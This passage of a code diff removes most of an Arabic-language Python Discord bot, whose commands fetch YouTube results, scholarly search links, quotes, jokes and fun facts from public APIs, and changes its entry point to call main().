-    for meaning in definitions:
-        part_of_speech = meaning.get("partOfSpeech", "")
-        defs = meaning.get("definitions", [])
-        if defs:
-            definition = defs[0].get("definition", "")
-            embed.add_field(name=part_of_speech, value=definition, inline=False)
-
-    await ctx.send(embed=embed)
-
-# -------------------- YouTube Search -------------------- #
-@bot.command(name="youtube", help="Search for YouTube tutorials")
-async def youtube(ctx, *, query: str):
-    url = f"https://www.googleapis.com/youtube/v3/search?part=snippet&maxResults=5&q={query}&key={YOUTUBE_API_KEY}"
-    async with aiohttp.ClientSession() as session:
-        async with session.get(url) as response:
-            data = await response.json()
-
-    items = data.get("items", [])
-    if not items:
-        await ctx.send("لم يتم العثور على نتائج على يوتيوب.")
-        return
-
-    embed = discord.Embed(title=f"نتائج يوتيوب لـ: {query}", color=discord.Color.red())
-    for item in items:
-        title = item['snippet']['title']
-        video_id = item['id'].get('videoId')
-        if video_id:
-            url = f"https://www.youtube.com/watch?v={video_id}"
-            embed.add_field(name=title, value=url, inline=False)
-
-    await ctx.send(embed=embed)
-
-# -------------------- Research Search -------------------- #
-@bot.command(name="research", help="Search for research or articles")
-async def research(ctx: commands.Context, *, query: str):
-    try:
-        service = build("customsearch", "v1", developerKey=GOOGLE_API_KEY)
-        res = service.cse().list(
-            q=query,
-            cx=CSE_ID,
-            num=10,
-            siteSearch="scholar.google.com"
-        ).execute()
-        items = res.get('items', [])
-
-        if not items:
-            await ctx.send("لم يتم العثور على أبحاث أو مقالات.")
-            return
-
-        embed = discord.Embed(title=f"نتائج البحث عن: {query}", color=discord.Color.dark_gold())
-        for item in items:
-            title = item.get("title", "لا يوجد عنوان")
-            link = item.get("link", "")
-            embed.add_field(name=title, value=link, inline=False)
-
-        await ctx.send(embed=embed)
-
-    except Exception as e:
-        await ctx.send(f"حدث خطأ: {str(e)}")
-
-# -------------------- Quote Command -------------------- #
-@bot.command(name="quote", help="Get a random inspirational quote")
-async def quote(ctx):
-    url = "https://api.quotable.io/random"
-    async with aiohttp.ClientSession() as session:
-        async with session.get(url) as response:
-            data = await response.json()
-
-    content = data["content"]
-    author = data["author"]
-    embed = discord.Embed(description=f"\"{content}\"", color=discord.Color.purple())
-    embed.set_footer(text=f"— {author}")
-    await ctx.send(embed=embed)
-
-# -------------------- Joke Command -------------------- #
-@bot.command(name="joke", help="Get a random joke")
-async def joke(ctx):
-        url = "https://official-joke-api.appspot.com/jokes/random"
-        async with aiohttp.ClientSession() as session:
-            async with session.get(url) as response:
-                data = await response.json()
-
-        setup = data["setup"]
-        punchline = data["punchline"]
-        # ترجمة بسيطة للنكتة (يمكن تطويرها لاحقاً)
-        joke_ar = f"نكتة:\n{setup} 😂\n||{punchline}||"
-        await ctx.send(joke_ar)
-
-# -------------------- Fact Command -------------------- #
-@bot.command(name="fact", help="Get a random fun fact")
-async def fact(ctx):
-    url = "https://uselessfacts.jsph.pl/random.json?language=en"
-    async with aiohttp.ClientSession() as session:
-        async with session.get(url) as response:
-            data = await response.json()
-
-    fact_text = data['text']
-
-    # حاولنا ترجمة النص تلقائياً (إن لم يكن لديك ترجمة يمكنك استخدام مكتبة ترجمة أو API)
-    # هنا ببساطة نضيف مقدمة عربية
-    fact_ar = f"🧠 هل تعلم؟ {fact_text}"
-    await ctx.send(fact_ar)
-# -------------------- Help Command -------------------- #
-@bot.command(name="h", help="Show all bot commands")
-async def help_command(ctx):
-    help_text = """
-**🤖 Available Commands:**
-`!image [query]` - 🔍 ابحث عن الصور
-`!define [word]` - 📖 احصل على تعريف كلمة
-`!youtube [topic]` - 🎥 ابحث عن شروحات على يوتيوب
-`!research [topic]` - 📚 ابحث عن أبحاث أو مقالات
-`!quote` - 💬 احصل على اقتباس ملهم عشوائي
-`!joke` - 😂 احصل على نكتة عشوائية
-`!fact` - 🧠 احصل على معلومة عشوائية ممتعة
-`!h` - ℹ️ عرض قائمة الأوامر
-    """
-    await ctx.send(help_text)
-
-# -------------------- Ready Event -------------------- #
-@bot.event
-async def on_ready():
-    print(f'✅ Logged in as {bot.user.name} ({bot.user.id})')
-
-# -------------------- Run Bot -------------------- #
 if __name__ == "__main__":
-    bot.run(DISCORD_TOKEN)
+                main()
